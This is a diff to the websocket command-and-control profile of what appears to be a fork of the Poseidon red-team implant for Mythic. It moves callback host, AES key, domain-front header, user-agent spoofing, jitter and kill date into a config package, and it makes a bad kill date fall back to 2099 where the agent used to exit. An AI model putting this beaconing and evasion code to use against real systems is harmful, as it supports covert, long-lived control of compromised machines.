@@ -16,6 +16,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/config"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils"
 
@@ -27,66 +28,6 @@ import (
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/crypto"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
 )
-
-// Websocket C2 profile variables from https://github.com/MythicC2Profiles/websocket/blob/master/C2_Profiles/websocket/mythic/c2_functions/websocket.py
-// base64 encoded version of the JSON initial configuration of Websocket
-var websocket_initial_config string
-
-type WebsocketInitialConfig struct {
-	CallbackHost           string
-	CallbackPort           uint
-	Killdate               string
-	Interval               uint
-	Jitter                 uint
-	EncryptedExchangeCheck bool
-	AESPSK                 string
-	Endpoint               string
-	DomainFront            string
-	TaskingType            string
-	UserAgent              string
-}
-
-func (e *WebsocketInitialConfig) UnmarshalJSON(data []byte) error {
-	alias := map[string]interface{}{}
-	err := json.Unmarshal(data, &alias)
-	if err != nil {
-		return err
-	}
-	if v, ok := alias["callback_host"]; ok {
-		e.CallbackHost = v.(string)
-	}
-	if v, ok := alias["callback_port"]; ok {
-		e.CallbackPort = uint(v.(float64))
-	}
-	if v, ok := alias["killdate"]; ok {
-		e.Killdate = v.(string)
-	}
-	if v, ok := alias["callback_interval"]; ok {
-		e.Interval = uint(v.(float64))
-	}
-	if v, ok := alias["callback_jitter"]; ok {
-		e.Jitter = uint(v.(float64))
-	}
-	if v, ok := alias["encrypted_exchange_check"]; ok {
-		e.EncryptedExchangeCheck = v.(bool)
-	}
-	if v, ok := alias["AESPSK"]; ok {
-		e.AESPSK = v.(string)
-	}
-	if v, ok := alias["ENDPOINT_REPLACE"]; ok {
-		e.Endpoint = v.(string)
-	}
-	if v, ok := alias["domain_front"]; ok {
-		e.DomainFront = v.(string)
-	}
-	if v, ok := alias["tasking_type"]; ok {
-		e.TaskingType = v.(string)
-	}
-	if v, ok := alias["USER_AGENT"]; ok {
-		e.UserAgent = v.(string)
-	}
-	return nil
-}
 
 const TaskingTypePush = "Push"
 const TaskingTypePoll = "Poll"
@@ -135,47 +76,36 @@ var websocketDialer = websocket.Dialer{
 	},
 }
 
-// New creates a new HTTP C2 profile from the package's global variables and returns it
 func init() {
-	initialConfigBytes, err := base64.StdEncoding.DecodeString(websocket_initial_config)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to decode initial websocket config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	initialConfig := WebsocketInitialConfig{}
-	err = json.Unmarshal(initialConfigBytes, &initialConfig)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial websocket config, exiting: %v\n", err))
-		os.Exit(1)
-	}
+	// Parse URL from config
 	var finalUrl string
 	var lastSlash int
-	if initialConfig.CallbackPort == 443 && strings.Contains(initialConfig.CallbackHost, "wss://") {
-		finalUrl = initialConfig.CallbackHost
-	} else if initialConfig.CallbackPort == 80 && strings.Contains(initialConfig.CallbackHost, "ws://") {
-		finalUrl = initialConfig.CallbackHost
+	callbackHost := config.WebsocketCallbackHost
+	callbackPort := uint(config.WebsocketCallbackPort)
+
+	if callbackPort == 443 && strings.Contains(callbackHost, "wss://") {
+		finalUrl = callbackHost
+	} else if callbackPort == 80 && strings.Contains(callbackHost, "ws://") {
+		finalUrl = callbackHost
 	} else {
-		lastSlash = strings.Index(initialConfig.CallbackHost[8:], "/")
+		lastSlash = strings.Index(callbackHost[8:], "/")
 		if lastSlash == -1 {
-			//there is no 3rd slash
-			finalUrl = fmt.Sprintf("%s:%d", initialConfig.CallbackHost, initialConfig.CallbackPort)
+			finalUrl = fmt.Sprintf("%s:%d", callbackHost, callbackPort)
 		} else {
-			//there is a 3rd slash, so we need to splice in the port
-			lastSlash += 8 // adjust this back to include our offset initially
-			//fmt.Printf("index of last slash: %d\n", last_slash)
-			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
-			finalUrl = fmt.Sprintf("%s:%d%s", initialConfig.CallbackHost[0:lastSlash], initialConfig.CallbackPort, initialConfig.CallbackHost[lastSlash:])
+			lastSlash += 8
+			finalUrl = fmt.Sprintf("%s:%d%s", callbackHost[0:lastSlash], callbackPort, callbackHost[lastSlash:])
 		}
 	}
 	if finalUrl[len(finalUrl)-1:] != "/" {
 		finalUrl = finalUrl + "/"
 	}
+
 	profile := C2Websockets{
-		HostHeader:            initialConfig.DomainFront,
+		HostHeader:            config.WebsocketDomainFront,
 		BaseURL:               finalUrl,
-		UserAgent:             initialConfig.UserAgent,
-		Key:                   initialConfig.AESPSK,
-		Endpoint:              initialConfig.Endpoint,
+		UserAgent:             config.WebsocketUserAgent,
+		Key:                   config.WebsocketAesPsk,
+		Endpoint:              config.WebsocketEndpoint,
 		ShouldStop:            true,
 		stoppedChannel:        make(chan bool, 1),
 		PushChannel:           make(chan structs.MythicMessage, 100),
@@ -184,35 +114,37 @@ func init() {
 		interruptSleepChannel: make(chan bool, 1),
 	}
 
-	// Convert sleep from string to integer
-	profile.Interval = int(initialConfig.Interval)
+	profile.Interval = config.WebsocketInterval
 	if profile.Interval < 0 {
 		profile.Interval = 0
 	}
 
-	// Convert jitter from string to integer
-	profile.Jitter = int(initialConfig.Jitter)
+	profile.Jitter = config.WebsocketJitter
 	if profile.Jitter < 0 {
 		profile.Jitter = 0
 	}
 
-	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
+	profile.ExchangingKeys = config.WebsocketEncryptedExchange
 
 	if len(profile.UserAgent) <= 0 {
 		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
 	}
 
-	if initialConfig.TaskingType == "" || initialConfig.TaskingType == "Poll" {
+	taskingType := config.WebsocketTaskingType
+	if taskingType == "" || taskingType == "Poll" {
 		profile.TaskingType = "Poll"
 	} else {
 		profile.TaskingType = "Push"
 	}
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
+
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", config.WebsocketKilldate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
-		os.Exit(1)
+		utils.PrintDebug(fmt.Sprintf("error parsing killdate, using far future: %v\n", err))
+		killDateTime = time.Date(2099, 12, 31, 0, 0, 0, 0, time.UTC)
 	}
 	profile.Killdate = killDateTime
+
 	RegisterAvailableC2Profile(&profile)
 	go profile.CreateMessagesForEgressConnections()
 }
